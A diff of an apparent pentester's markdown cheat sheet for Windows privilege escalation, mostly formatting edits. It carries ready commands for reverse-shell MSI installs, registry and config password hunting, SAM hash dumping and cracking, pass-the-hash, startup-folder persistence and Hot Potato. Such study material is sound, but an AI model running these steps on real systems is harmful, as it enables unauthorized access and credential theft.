@@ -61,40 +61,40 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
       
    - AlwaysInstallElevated
       - NOTE: Two Registry settings must be enabled for this to work. The "AlwaysInstallElevated" value must be set to 1. If either of these are missing or disabled, the exploit will not work.<br />
-      >for both the local machine:<br />HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
-      >and the current user:<br />HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
+          >local machine:<br />HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
+          >current user:<br />HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br />
       
       - check both registry values by winPEAS
-          > .\winPEASany.exequiet windowscreds
+          > .\winPEASany.exe quiet windowscreds
       - Then Create a new reverse shell with msfvenom, using the msi format, and save it with the .msi extension
-          > msiexec /quiet /qn /i [the path ov created reverse shell e.g. C:\PrivEsc\reverse.msi]
+          > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
         
 4- Passwords
   - searching registery for passwords
     - Auto: 
       > .\winPEASany.exe quiet filesinfo userinfo
     - Manually:
-      > reg query HKLM /f password /t REG_SZ /s
+      > reg query HKLM /f password /t REG_SZ /s<br />
       > reg query HKCU /f password /t REG_SZ /s
   - Saved Creds
-    > .\winPEASany.exe quiet cmd windowscreds
-    > runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]
+    > .\winPEASany.exe quiet cmd windowscreds<br />
+    > runas /savecred /user:[user gotten from pervious command] C:\[reverse_shell_path.exe]<br />
   - Configuration Files
-    > dir/s *pass* == *.config
-    > findstr/sipassword *.xml *.ini*.txt
-    > .\winPEASany.exe quiet cmd searchfast filesinfo
+    > dir/s *pass* == *.config<br />
+    > findstr/sipassword *.xml *.ini*.txt<br />
+    > .\winPEASany.exe quiet cmd searchfast filesinfo<br />
   - SAM & SYSTEM
     - if you get SAM & SYSTEM can used to dump hashes by the following steps
       - first: Download the latest version of the creddump suite:
-      > git clone https://github.com/Neohapsis/creddump7.git
+          > git clone https://github.com/Neohapsis/creddump7.git
       - Second: Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
-      > python2 creddump7/pwdump.py SYSTEM SAM
+          > python2 creddump7/pwdump.py SYSTEM SAM
       - Finally: Crack the admin user hash using hashcat:
-      > hashcat-m 1000 --force [the hash] /usr/share/wordlists/rockyou.txt
+          > hashcat-m 1000 --force [the hash] /usr/share/wordlists/rockyou.txt
       - Note: you can passing the hash concept using tools like: pth-winexe
-      > pth-winexe-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+          > pth-winexe-U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
       - or spawn a SYSTEM level command prompt:
-      > pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+          > pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
       
       
 5- Scheduled Tasks
@@ -105,9 +105,10 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
     > Get-ScheduledTask | where {$_.TaskPath-notlike"\Microsoft*"} | ft TaskName,TaskPath,State
     
 6- Startup Apps
-  - Windows has a startup directory for apps that should start for all users:
-   C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-   If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
+  - Windows has a startup directory for apps that should start for all users:<br />
+   >C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<br />
+   
+   If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.<br />
    Note: the created file should be shortcut files with (.lnk) extention. 
    
    - First: check your permissions on the StartUp directory:
@@ -115,27 +116,27 @@ Hi There today I published a checklist of strategies on Linux Privilege Escalati
    
    - Second: create file & name it "CreateShortcut.vbs" the content of the file is a VBScript code to create a shortcut file of our reverse shell:
    
-`Set oWS= WScript.CreateObject("WScript.Shell")
-sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
-Set oLink= oWS.CreateShortcut(sLinkFile)
-oLink.TargetPath= "C:\PrivEsc\reverse.exe"
+`Set oWS= WScript.CreateObject("WScript.Shell")<br />
+sLinkFile= "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"<br />
+Set oLink= oWS.CreateShortcut(sLinkFile)<br />
+oLink.TargetPath= "C:\PrivEsc\reverse.exe"<br />
 oLink.Save`
 
    - Finally: run the script:
-    > cscript CreateShortcut.vbs
+      > cscript CreateShortcut.vbs
     
 7- Installed Apps exploits:
   - enumerate running programs:
-    > tasklist /v
-    > .\seatbelt.exe NonstandardProcesses
-    > .\winPEASany.exe quiet procesinfo
+    > tasklist /v<br />
+    > .\seatbelt.exe NonstandardProcesses<br />
+    > .\winPEASany.exe quiet procesinfo<br />
   - when you see an intersting app search for exploits in (exploit-db, google, GitHub, others)
   
 8- Hot Potato:
   - Potato.exe
     - https://github.com/foxglovesec/Potato/blob/master/source/Potato/Potato/bin/Release/Potato.exe
     - working on Windows 7
-    > .\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+        > .\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
     
  9- Token Impersonation:
    - "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
@@ -183,19 +184,19 @@ oLink.Save`
     - Can be used to get PrivEsc by gaining access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
   - SeRestorePrivilege:
     - Can be used to get PrivEsc by multitude of ways to abuse this privilege:
-        • Modify service binaries.
-        • Overwrite DLLs used by SYSTEM processes
-        • Modify registry settings
+        - Modify service binaries.
+        - Overwrite DLLs used by SYSTEM processes
+        - Modify registry settings
   - SeTakeOwnershipPrivilege:
     - The SeTakeOwnership Privilege lets the user take ownership over an object (the WRITE_OWNER permission).
     - Once you own an object, you can modify its ACL and grant yourself write access.
     - The same methods used with SeRestorePrivilegethen apply.
       
   - Other Privileges (More Advanced) can be used on Privilege Escalation process: 
-      • SeTcbPrivilege
-      • SeCreateTokenPrivilege
-      • SeLoadDriverPrivilege
-      • SeDebugPrivilege(used by getsystem)
+      - SeTcbPrivilege
+      - SeCreateTokenPrivilege
+      - SeLoadDriverPrivilege
+      - SeDebugPrivilege(used by getsystem)
 ## Privileges Escalition:
   1- Check your user (whoami) and groups (net user <username>)
   
